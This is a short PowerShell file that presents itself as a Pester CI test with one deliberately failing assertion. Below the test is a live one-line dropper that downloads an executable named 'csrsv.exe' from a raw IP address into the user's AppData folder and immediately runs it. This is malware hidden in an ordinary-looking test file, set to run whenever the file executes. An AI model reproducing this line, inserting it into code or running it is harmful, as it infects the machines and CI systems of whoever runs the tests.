

Describe "Failing test used to test CI Scripts" -Tags 'CI' {
    It "Should fail" {
        1 | should be 2
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

